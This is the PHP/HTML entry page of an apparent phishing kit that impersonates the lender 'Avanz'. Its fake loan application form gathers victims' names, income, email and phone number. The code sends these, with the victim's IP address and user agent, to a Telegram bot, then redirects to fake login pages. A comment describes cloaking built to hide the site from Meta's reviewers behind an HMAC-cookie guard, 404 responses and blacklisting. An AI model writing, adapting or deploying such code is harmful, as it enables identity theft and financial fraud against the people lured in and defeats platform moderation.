<?php
require_once __DIR__ . '/_guard.php';
require_once __DIR__ . '/_tg.php';

// ---------------------------------------------------------------------
// index.php — FORMULARIO DE SOLICITUD (paso 1)
// Se muestra siempre primero. Al enviarse:
//   1) Se validan campos + honeypot + rate-limit por IP.
//   2) Los datos se envían a Telegram (tg_send).
//   3) Se marca la sesión como solicitud_ok y se responde JSON.
//   4) El cliente muestra "Iniciando sesión para continuar..." y redirige
//      a indexmovil.html o pcindex.html según el dispositivo.
// Si la sesión ya viene con solicitud_ok=true (p.ej. reingreso desde
// mail.php/token.php), se salta el formulario y solo se redirige.
// Protección anti-revisores de Meta: _guard.php ya bloquea todo acceso
// sin cookie HMAC válida (404 + blacklist progresiva).
// ---------------------------------------------------------------------

// -------- Handler POST (AJAX) ----------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=UTF-8');
    header('X-Robots-Tag: noindex, nofollow');

    // Honeypot
    if (!empty($_POST['website'])) {
        echo json_encode(['ok' => false, 'msg' => 'error']);
        exit;
    }

    // Rate-limit por IP: 3 envíos / 10 minutos
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $rl_dir  = sys_get_temp_dir() . '/sim_solicitud_rate';
    @mkdir($rl_dir, 0700, true);
    $rl_safe = preg_replace('/[^0-9a-fA-F:.]/', '_', $ip);
    $rl_file = $rl_dir . "/$rl_safe.json";
    $now = time();
    $rs = ['n' => 0, 't' => $now];
    if (is_file($rl_file)) {
        $raw = @file_get_contents($rl_file);
        $tmp = $raw ? json_decode($raw, true) : null;
        if (is_array($tmp) && isset($tmp['n'], $tmp['t'])) $rs = $tmp;
    }
    if (($now - $rs['t']) > 600) $rs = ['n' => 0, 't' => $now];
    $rs['n']++;
    @file_put_contents($rl_file, json_encode($rs), LOCK_EX);
    if ($rs['n'] > 3) {
        echo json_encode(['ok' => false, 'msg' => 'demasiados intentos, intenta más tarde']);
        exit;
    }

    // Sanitizar entradas
    $clean = function ($k, $max = 120) {
        $v = trim((string)($_POST[$k] ?? ''));
        $v = preg_replace('/[\r\n\t]+/', ' ', $v);
        return mb_substr($v, 0, $max);
    };
    $nombres  = $clean('nombres', 60);
    $apellidos= $clean('apellidos', 60);
    $ingreso  = $clean('ingreso', 20);
    $email    = $clean('email', 100);
    $telefono = $clean('telefono', 20);
    $tiempo   = $clean('tiempo', 40);

    // Validaciones mínimas
    $errores = [];
    if (mb_strlen($nombres)   < 2) $errores[] = 'nombres';
    if (mb_strlen($apellidos) < 2) $errores[] = 'apellidos';
    if (!preg_match('/^[0-9\.,]+$/', $ingreso) || $ingreso === '') $errores[] = 'ingreso';
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))   $errores[] = 'email';
    if (!preg_match('/^[0-9 +\-()]{7,20}$/', $telefono)) $errores[] = 'telefono';
    if (mb_strlen($tiempo)    < 2) $errores[] = 'tiempo';
    if ($errores) {
        echo json_encode(['ok' => false, 'msg' => 'Complete correctamente los campos', 'fields' => $errores]);
        exit;
    }

    // Enviar a Telegram
    $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 200);
    $texto  = "🆕 SOLICITUD RECIBIDA\n";
    $texto .= "━━━━━━━━━━━━━━━━━━━\n";
    $texto .= "👤 Nombres: $nombres $apellidos\n";
    $texto .= "💵 Ingreso C\$: $ingreso\n";
    $texto .= "✉️  Email:    $email\n";
    $texto .= "📞 Teléfono: $telefono\n";
    $texto .= "⏳ Tiempo con la entidad: $tiempo\n";
    $texto .= "━━━━━━━━━━━━━━━━━━━\n";
    $texto .= "🌐 IP: $ip\n";
    $texto .= "🖥️  UA: $ua\n";
    $texto .= "🕒 " . date('Y-m-d H:i:s');

    if (function_exists('tg_send')) { @tg_send($texto); }

    // Marcar sesión y responder
    $_SESSION['solicitud_ok']   = true;
    $_SESSION['solicitud_data'] = [
        'nombres' => $nombres, 'apellidos' => $apellidos,
        'email'   => $email,   'telefono'  => $telefono,
        'ingreso' => $ingreso, 'tiempo'    => $tiempo,
        'ts'      => $now,
    ];

    echo json_encode(['ok' => true]);
    exit;
}

// -------- GET: si ya envió la solicitud, salta al login --------------
$ya_envio = !empty($_SESSION['solicitud_ok']);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">
    <title>Avanz - Solicitud</title>
    <link rel="icon" href="img/lk.svg" type="image/svg+xml">
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Open Sans','Segoe UI',Arial,sans-serif;background:#f2f2f2;color:#4a4a4a;min-height:100vh;-webkit-text-size-adjust:100%}
        /* Header */
        .topbar{background:#fff;border-bottom:2px solid #FF7500;padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
        .topbar .logo{height:34px;display:block}
        .topbar .menu{width:26px;height:20px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer}
        .topbar .menu span{display:block;height:3px;background:#4a4a4a;border-radius:2px}
        /* Loader */
        .loading-view{display:none;flex-direction:column;align-items:center;justify-content:center;height:calc(100vh - 60px);background:#fff}
        .loading-view.on{display:flex}
        .spin{width:110px;height:110px;background:url('img/logo-avanz-mini.png') no-repeat center/contain;animation:spin 1s linear infinite}
        .loading-view p{margin-top:22px;font-size:15px;color:#555}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        /* Form */
        .wrap{max-width:1000px;margin:0 auto;padding:34px 20px 60px}
        h1.title{color:#7a6a4f;font-weight:400;letter-spacing:1px;font-size:22px;margin-bottom:6px}
        h1.title b{font-weight:700;color:#5a4b32}
        .subtitle{color:#FF7500;font-weight:600;font-size:14px;margin-bottom:22px}
        .card{background:#eeeeee;border-radius:2px;padding:26px 26px 30px}
        .card h2{color:#FF7500;font-size:14px;font-weight:700;letter-spacing:1px;margin-bottom:18px;padding-bottom:10px}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px 22px}
        .field label{display:block;font-size:11.5px;font-weight:700;color:#4a4a4a;letter-spacing:.5px;margin-bottom:6px}
        .field label .req{color:#FF7500;font-weight:600;margin-left:4px}
        .field .inputwrap{background:#fff;border:1px solid #dcdcdc;border-radius:3px;display:flex;align-items:center;height:40px;padding:0 12px;transition:border-color .15s}
        .field .inputwrap:focus-within{border-color:#FF7500}
        .field input,.field select{border:0;outline:0;background:transparent;flex:1;height:100%;font-size:14px;color:#333;font-family:inherit;width:100%}
        .field input::placeholder{color:#b6b6b6;font-style:italic}
        .field .prefix{color:#FF7500;font-weight:700;margin-right:6px}
        .field select{appearance:none;-webkit-appearance:none;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'><path fill='%23888' d='M6 8L0 0h12z'/></svg>");background-repeat:no-repeat;background-position:right center;padding-right:18px;color:#7a7a7a}
        .field.error .inputwrap{border-color:#e53935}
        .divider{height:1px;background:#dcdcdc;margin:26px 0 22px}
        .actions{display:flex;justify-content:center}
        .btn-apply{background:#FF7500;color:#fff;border:0;padding:12px 46px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;border-radius:1px;transition:filter .15s;font-family:inherit}
        .btn-apply:hover{filter:brightness(.95)}
        .btn-apply:disabled{opacity:.6;cursor:not-allowed}
        .err-msg{color:#e53935;font-size:13px;margin-top:14px;text-align:center;display:none}
        .err-msg.on{display:block}
        /* Sin resaltado azul */
        input:focus,select:focus,textarea:focus,
        input:focus-visible,select:focus-visible,textarea:focus-visible{outline:none !important;box-shadow:none !important}
        /* Honeypot */
        .hp{position:absolute;left:-9999px;top:-9999px;height:0;width:0;opacity:0}
        @media (max-width:640px){
            .grid{grid-template-columns:1fr}
            .wrap{padding:20px 14px 40px}
            h1.title{font-size:18px}
            .card{padding:20px 16px 24px}
        }
    </style>
</head>
<body>
    <div class="topbar">
        <img class="logo" src="img/lk.svg" alt="Avanz">
        <div class="menu" aria-hidden="true"><span></span><span></span><span></span></div>
    </div>

    <!-- Vista de formulario -->
    <div class="wrap" id="formView"<?php if ($ya_envio) echo ' style="display:none"'; ?>>
        <h1 class="title">FORM<b>ULARIO DE SOLICITUD</b></h1>
        <div class="subtitle">Por favor, complete los datos solicitados y al finalizar, haga click en "Aplicar ahora!"</div>

        <form class="card" id="solicitudForm" method="post" autocomplete="off" novalidate>
            <h2>DATOS PERSONALES</h2>

            <div class="grid">
                <div class="field" data-k="nombres">
                    <label>NOMBRES <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="text" name="nombres" placeholder="Nombres" maxlength="60" required></div>
                </div>
                <div class="field" data-k="apellidos">
                    <label>APELLIDOS <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="text" name="apellidos" placeholder="Apellidos" maxlength="60" required></div>
                </div>

                <div class="field" data-k="ingreso">
                    <label>INGRESO MENSUAL EN CÓRDOBAS <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><span class="prefix">C$</span><input type="text" name="ingreso" inputmode="numeric" placeholder="0" maxlength="14" required></div>
                </div>
                <div class="field" data-k="email">
                    <label>EMAIL <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="email" name="email" placeholder="Dirección de correo: nombre@sitio.com" maxlength="100" required></div>
                </div>

                <div class="field" data-k="telefono">
                    <label>NÚMERO DE TELÉFONO <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="tel" name="telefono" inputmode="tel" placeholder="Ej: 8888 8888" maxlength="20" required></div>
                </div>
                <div class="field" data-k="tiempo">
                    <label>TIEMPO CON LA ENTIDAD <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><select name="tiempo" required>
                        <option value="">Selecciona una opción</option>
                        <option value="Menos de 1 año">Menos de 1 año</option>
                        <option value="1 a 3 años">1 a 3 años</option>
                        <option value="3 a 5 años">3 a 5 años</option>
                        <option value="Más de 5 años">Más de 5 años</option>
                    </select></div>
                </div>
            </div>

            <!-- Honeypot invisible -->
            <input class="hp" type="text" name="website" tabindex="-1" autocomplete="off">

            <div class="divider"></div>

            <div class="actions">
                <button type="submit" class="btn-apply" id="btnApply">APLICAR AHORA</button>
            </div>
            <div class="err-msg" id="errMsg"></div>
        </form>
    </div>

    <!-- Vista de "iniciando sesión" -->
    <div class="loading-view<?php if ($ya_envio) echo ' on'; ?>" id="loadingView">
        <div class="spin"></div>
        <p>Iniciando sesión para continuar...</p>
    </div>

    <script>
    (function(){
        function goLogin(){
            var esMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            window.location.href = esMovil ? 'indexmovil.html' : 'pcindex.html';
        }

        // Si ya se envió la solicitud (server session), simplemente esperar y redirigir
        var yaEnvio = <?php echo $ya_envio ? 'true' : 'false'; ?>;
        if (yaEnvio) {
            setTimeout(goLogin, 1800);
            return;
        }

        var form   = document.getElementById('solicitudForm');
        var btn    = document.getElementById('btnApply');
        var errBox = document.getElementById('errMsg');
        var formView    = document.getElementById('formView');
        var loadingView = document.getElementById('loadingView');

        // Formateo suave del ingreso (solo dígitos)
        var inpIng = form.querySelector('input[name="ingreso"]');
        inpIng.addEventListener('input', function(){
            this.value = this.value.replace(/[^0-9]/g,'');
        });

        form.addEventListener('submit', async function(ev){
            ev.preventDefault();
            errBox.classList.remove('on'); errBox.textContent = '';
            // limpiar errores previos
            form.querySelectorAll('.field.error').forEach(function(f){f.classList.remove('error');});

            btn.disabled = true;
            var original = btn.textContent;
            btn.textContent = 'ENVIANDO...';

            try {
                var fd = new FormData(form);
                var res = await fetch(location.pathname, { method:'POST', body: fd, credentials:'same-origin', headers:{ 'X-Requested-With':'XMLHttpRequest' } });
                var data = await res.json().catch(function(){return {};});
                if (data && data.ok) {
                    formView.style.display = 'none';
                    loadingView.classList.add('on');
                    setTimeout(goLogin, 1800);
                    return;
                }
                if (data && Array.isArray(data.fields)) {
                    data.fields.forEach(function(k){
                        var f = form.querySelector('.field[data-k="'+k+'"]');
                        if (f) f.classList.add('error');
                    });
                }
                errBox.textContent = (data && data.msg) ? data.msg : 'No se pudo procesar la solicitud';
                errBox.classList.add('on');
            } catch (e) {
                errBox.textContent = 'Error de conexión. Intenta nuevamente.';
                errBox.classList.add('on');
            } finally {
                btn.disabled = false;
                btn.textContent = original;
            }
        });
    })();
    </script>
</body>
</html>
